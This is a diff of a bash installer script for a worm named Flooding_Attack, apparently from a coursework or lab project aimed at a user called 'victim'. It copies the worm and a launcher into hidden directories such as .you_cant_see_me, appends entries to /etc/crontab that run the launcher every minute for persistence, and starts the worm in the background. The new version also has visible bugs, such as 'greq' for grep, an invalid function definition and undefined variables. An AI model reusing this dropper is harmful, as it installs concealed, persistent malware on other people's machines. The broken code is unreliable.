@@ -4,70 +4,72 @@
 # (1) Put the worm binary at the two locations:
 #      * /home/victim/.etc/.module/Flooding_Attack
 #      * /home/victim/.firefox/.module/Flooding_Attack
-# (2) Put the worm checker program at "/home/victim/.Launch_Attack/Launching_Attack"
+# (2) Put the worm launcher program at 
+#      * /home/victim/.Launch_Attack/Launching_Attack
+#      * /home/victim/.you_cant_see_me/Launching_Attack
 # (3) Tamper the crontab so that the worm is executed whenever the computer is booted
 # 
 # Noted that this script does not do any payload.
 
-readonly ldir="/home/victim/.Launch_Attack"
-readonly lfname="Launching_Attack"
+ldir1="/home/victim/.Launch_Attack"
+ldir2="/home/victim/.you_cant_see_me"
+lfname="Launching_Attack"
+wdir1="/home/victim/.etc/.module"
+wdir2="/home/victim/.firefox/.module"
+wfname="Flooding_Attack"
 
-tamper_crontab() {
+require_crontan_tampered() {
     local crtbpath="/etc/crontab"
-
-    if  grep -q "$ldir/$lfname" $crtbpath; then
-        echo "Crontab already tampered."
-        return 0
+    if  ! grep -q "$ldir1/$lfname" $crtbpath; then
+        echo "* * * * * cd '$ldir1' && [ -f '$ldir1/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath
     fi
-
-    if  echo "@reboot root cd '$ldir' && [ -f '$ldir/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath; then
-        echo "Corntab tampered."
-        return 0
-    else
-        echo "Failed to tamper crontab."
-        return 1
+    if  ! grep -q "$ldir2/$lfname" $crtbpath; then
+        echo "* * * * * cd '$ldir2' && [ -f '$ldir2/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath
     fi
 }
 
-distribute_worm() {
-    local wormbin="Flooding_Attack"
-    local dir1="/home/victim/.etc/.module"
-    local dir2="/home/victim/.firefox/.module"
-
-    if  mkdir -p $dir1 &> /dev/null &&\
-        mkdir -p $dir2 &> /dev/null &&\
-        cp "./$wormbin" "$dir1/$wormbin" &> /dev/null &&\
-        cp "./$wormbin" "$dir2/$wormbin" &> /dev/null ; then
-        echo "Worm distributed."
-        return 0
-    else
-        echo "Failed to distribute the worm."
-        return 1
+require_worm_distributed()() {
+    if [ ! -f "$wdir1/$wfname" ]; then
+        mkdir -p $wdir1
+        cp "./$wfname" "$wdir1/$wfname"
+    fi
+    if [ ! -f "$dir2/$wormbin" ]; then
+        mkdir -p $wdir2
+        cp "./$wfname" "$wdir2/$wfname"
     fi
 }
 
-distribute_worm_launcher(){
-    mkdir -p "$ldir" &> /dev/null
-    if  g++ -o "$ldir/$lfname" worm_launcher.cpp &> /dev/null; then
-        echo "Worm launcher distributed."
-        return 0
-    else
-        echo "Failed to distribute worm launcher"
-        return 1
+require_launcher_distributed(){
+    if [ ! -f "$ldir1/$lfname" ]; then
+        mkdir -p "$ldir1"
+        cp -f ./worm_launcher "$ldir1/$lfname"
+    fi
+    if [ ! -f "$ldir2/$lfname" ]; then
+        mkdir -p "$ldir2"
+        cp -f ./worm_launcher "$ldir2/$lfname"
     fi
 }
 
-start_flood_attack(){
+require_worm_running(){
+    ps -e | greq -q "$wdir1/$wfname"
+    if [ $? -eq 0 ]; then 
+        echo "The worm is already running" 
+        return; 
+    fi
+    ps -e | greq -q "$wdir2/$wfname"
+    if [ $? -eq 0 ]; then 
+        echo "The worm is already running" 
+        return; 
+    fi
+
     # The final & makes this command run in background
-    chmod +x $ldir/$lfname && $ldir/$lfname &> /dev/null & 
+    chmod +x $wdir1/$wfname && $wdir1/$wfname &> /dev/null & 
+    echo "The worm is launched."
 }
 
 parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
 cd "$parent_path"
-if  distribute_worm_launcher && distribute_worm && tamper_crontab ; then
-    start_flood_attack &&\
-    echo "All tasks successed. Flood attack starts." ||\
-    echo "All tasks successed but cannot run the worm. Try rebooting the computer."
-else
-    echo "Task failed."
-fi
+require_crontan_tampered
+require_launcher_distributed
+require_worm_distributed
+require_worm_running
